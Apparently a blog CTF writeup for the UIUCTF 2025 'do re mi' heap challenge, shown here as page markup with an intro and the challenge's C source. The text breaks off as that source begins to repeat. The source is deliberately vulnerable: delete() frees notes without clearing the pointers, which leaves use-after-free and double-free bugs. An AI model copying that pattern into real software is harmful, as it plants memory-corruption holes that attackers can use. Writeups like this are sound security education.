<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en-us">
  <head><script src="/d1ff/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=d1ff/livereload" data-no-instant defer></script>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>UIUCTF 2025 Writeup (Pwn/&#34;Do Re Mi&#34;) - d1ff</title><meta name="author" content="_d1ff">
<meta name="description" content="Over the weekend, I played UIUCTF with some friends, and it turned out to be a really enjoyable experience.
The pwn challenges were the highlight for me — they were challenging enough to make me think hard, but also rewarding once I pieced things together.
In this writeup, I’ll go through the do re mi challenge step by step and explain how I solved it.
Before jumping into the exploit, let’s first get a feel for the source code that drives the challenge.
"><meta name="keywords" content='Mimalloc, tcache_poisoning'>
  <meta itemprop="name" content="UIUCTF 2025 writeup (pwn/&#34;do re mi&#34;)">
  <meta itemprop="description" content="Over the weekend, I played UIUCTF with some friends, and it turned out to be a really enjoyable experience.
The pwn challenges were the highlight for me — they were challenging enough to make me think hard, but also rewarding once I pieced things together.
In this writeup, I’ll go through the do re mi challenge step by step and explain how I solved it.
Before jumping into the exploit, let’s first get a feel for the source code that drives the challenge.">
  <meta itemprop="datePublished" content="2025-08-17T10:30:00+05:30">
  <meta itemprop="dateModified" content="2025-08-17T10:30:00+05:30">
  <meta itemprop="wordCount" content="2959">
  <meta itemprop="keywords" content="Mimalloc,Tcache_poisoning"><meta property="og:url" content="http://localhost:1313/d1ff/posts/uiu_writeup/doremi/">
  <meta property="og:site_name" content="d1ff">
  <meta property="og:title" content="UIUCTF 2025 writeup (pwn/&#34;do re mi&#34;)">
  <meta property="og:description" content="Over the weekend, I played UIUCTF with some friends, and it turned out to be a really enjoyable experience.
The pwn challenges were the highlight for me — they were challenging enough to make me think hard, but also rewarding once I pieced things together.
In this writeup, I’ll go through the do re mi challenge step by step and explain how I solved it.
Before jumping into the exploit, let’s first get a feel for the source code that drives the challenge.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-08-17T10:30:00+05:30">
    <meta property="article:modified_time" content="2025-08-17T10:30:00+05:30">
    <meta property="article:tag" content="Mimalloc">
    <meta property="article:tag" content="Tcache_poisoning">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="UIUCTF 2025 writeup (pwn/&#34;do re mi&#34;)">
  <meta name="twitter:description" content="Over the weekend, I played UIUCTF with some friends, and it turned out to be a really enjoyable experience.
The pwn challenges were the highlight for me — they were challenging enough to make me think hard, but also rewarding once I pieced things together.
In this writeup, I’ll go through the do re mi challenge step by step and explain how I solved it.
Before jumping into the exploit, let’s first get a feel for the source code that drives the challenge.">
      <meta name="twitter:site" content="@Anuj1337">
<meta name="twitter:creator" content="@Anuj1337" /><meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="http://localhost:1313/d1ff/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/d1ff/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/d1ff/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/d1ff/apple-touch-icon.png"><link rel="mask-icon" href="http://localhost:1313/d1ff/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/d1ff/posts/uiu_writeup/doremi/" title="UIUCTF 2025 writeup (pwn/&#34;do re mi&#34;) - d1ff" /><link rel="prev" type="text/html" href="http://localhost:1313/d1ff/posts/smiley_writeup/limit/" title="SmileyCTF 2025 writeup (pwn/limit)" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/d1ff/posts/uiu_writeup/doremi/index.md" title="UIUCTF 2025 writeup (pwn/\"do re mi\") - d1ff"><link rel="stylesheet" href="http://localhost:1313/d1ff/css/style.min.css"><link rel="preload" href="http://localhost:1313/d1ff/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="http://localhost:1313/d1ff/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="http://localhost:1313/d1ff/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="http://localhost:1313/d1ff/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "UIUCTF 2025 writeup (pwn/\"do re mi\")",
    "inLanguage": "en-us",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/d1ff\/posts\/uiu_writeup\/doremi\/"
    },"genre": "posts","keywords": "Mimalloc, tcache_poisoning","wordcount":  2959 ,
    "url": "http:\/\/localhost:1313\/d1ff\/posts\/uiu_writeup\/doremi\/","datePublished": "2025-08-17T10:30:00+05:30","dateModified": "2025-08-17T10:30:00+05:30","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "_d1ff"
      },"description": ""
  }
  </script><script src="http://localhost:1313/d1ff/js/head/color-scheme.min.js"></script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="http://localhost:1313/d1ff/" title="d1ff"><img class="logo" src='http://localhost:1313/d1ff/images/me.jpg' alt="d1ff" height="32" width="32"><span class="header-title-text">d1ff</span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="http://localhost:1313/d1ff/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item">
              <a class="menu-link" href="http://localhost:1313/d1ff/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="http://localhost:1313/d1ff/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="http://localhost:1313/d1ff/" title="d1ff"><img class="logo" src='http://localhost:1313/d1ff/images/me.jpg' alt="d1ff" height="26" width="26"><span class="header-title-text">d1ff</span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="menu-item"><a class="menu-link" href="http://localhost:1313/d1ff/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item"><a class="menu-link" href="http://localhost:1313/d1ff/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="http://localhost:1313/d1ff/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>UIUCTF 2025 Writeup (Pwn/&#34;Do Re Mi&#34;)</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="https://discord.com/users/1157208253055381504" title="Author"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img class="avatar" src='http://localhost:1313/d1ff/images/me.jpg' alt="_d1ff" height="16" width="16">&nbsp;_d1ff</a></span><span class="post-included-in">&nbsp;included in <a href="http://localhost:1313/d1ff/categories/pwning/" class="post-category" title="Category - Pwning"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Pwning</a></span></div><div class="post-meta-line"><span title="published on 2025-08-17 10:30:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-08-17">2025-08-17</time></span>&nbsp;<span title="2959 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 3000 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>14 minutes</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#source-code">Source Code</a>
      <ul>
        <li><a href="#main-function">Main Function</a></li>
        <li><a href="#case-1-create">Case 1: <code>create()</code></a></li>
        <li><a href="#case-2-look">Case 2: <code>look()</code></a></li>
        <li><a href="#case-3-delete">Case 3: <code>delete()</code></a></li>
        <li><a href="#case-4-update">Case 4: <code>update()</code></a></li>
        <li><a href="#other-challenge-info">Other challenge Info</a></li>
      </ul>
    </li>
    <li><a href="#mimalloc">Mimalloc</a>
      <ul>
        <li><a href="#setuplinking">Setup/Linking</a></li>
        <li><a href="#but-how-does-mimalloc-make-allocations">But How does Mimalloc make Allocations?</a></li>
        <li><a href="#free-list-sharding">Free list sharding</a></li>
      </ul>
    </li>
    <li><a href="#getting-leaks">Getting Leaks</a></li>
    <li><a href="#exploitation">Exploitation</a></li>
    <li><a href="#summary">♘Summary</a></li>
    <li><a href="#resources--references">Resources &amp; References</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><p>Over the weekend, I played <strong>UIUCTF</strong> with some friends, and it turned out to be a really enjoyable experience.</p>
<p>The <strong>pwn challenges</strong> were the highlight for me — they were challenging enough to make me think hard, but also rewarding once I pieced things together.</p>
<p>In this writeup, I’ll go through the <code>do re mi</code> challenge step by step and explain how I solved it.</p>
<p>Before jumping into the exploit, let’s first get a feel for the <strong>source code</strong> that drives the challenge.</p>
<h2 class="heading-element" id="source-code"><span>Source Code</span>
  <a href="#source-code" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">create</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">update</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">delete</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">look</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">get_index</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define NOTE_COUNT 16
</span></span></span><span class="line"><span class="cl"><span class="cp">#define NOTE_SIZE  128
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span> <span class="n">notes</span> <span class="p">[</span><span class="n">NOTE_COUNT</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define INTRO &#34;\
</span></span></span><span class="line"><span class="cl"><span class="cp">###################################\n\
</span></span></span><span class="line"><span class="cl"><span class="cp"># Yet Another Heap Note Challenge #\n\
</span></span></span><span class="line"><span class="cl"><span class="cp">###################################\n\
</span></span></span><span class="line"><span class="cl"><span class="cp">    What Would You Like to Do:     \n\
</span></span></span><span class="line"><span class="cl"><span class="cp">        1. Create a Note           \n\
</span></span></span><span class="line"><span class="cl"><span class="cp">        2. Delete a Note           \n\
</span></span></span><span class="line"><span class="cl"><span class="cp">        3. Read a Note             \n\
</span></span></span><span class="line"><span class="cl"><span class="cp">        4. Update a Note           \n\
</span></span></span><span class="line"><span class="cl"><span class="cp">        5. Exit                    \n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PMT &#34;YAHNC&gt; &#34;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="n">INTRO</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="nb">true</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">option</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="n">PMT</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34; %u&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">option</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Invalid Input.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">&gt;=</span> <span class="mi">6</span> <span class="o">||</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Invalid Range.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">switch</span><span class="p">(</span><span class="n">option</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">1</span><span class="o">:</span> 
</span></span><span class="line"><span class="cl">                <span class="nf">create</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">2</span><span class="o">:</span> 
</span></span><span class="line"><span class="cl">                <span class="nf">delete</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="nf">look</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="nf">update</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">get_index</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">number</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Position? (0-15): &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34; %u&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">number</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Invalid Input.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">number</span> <span class="o">&gt;=</span> <span class="mi">16</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Invalid Range.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">number</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">create</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">number</span> <span class="o">=</span> <span class="nf">get_index</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">notes</span><span class="p">[</span><span class="n">number</span><span class="p">]</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Done!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">look</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">number</span> <span class="o">=</span> <span class="nf">get_index</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">STDOUT_FILENO</span><span class="p">,</span> <span class="n">notes</span><span class="p">[</span><span class="n">number</span><span class="p">],</span> <span class="n">NOTE_SIZE</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Done!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">delete</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">number</span> <span class="o">=</span> <span class="nf">get_index</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">   <span class="nf">free</span><span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">number</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">   <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Done!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">update</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">number</span> <span class="o">=</span> <span class="nf">get_index</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Content? (127 max): &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="n">notes</span><span class="p">[</span><span class="n">number</span><span class="p">],</span> <span class="n">NOTE_SIZE</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Done!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>from the look of the code it definitely looks like a classic heap notes type pwn challenge</p>
<p>Lets understand it closely</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">create</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">update</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">delete</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">look</span><span class="p">();</span>
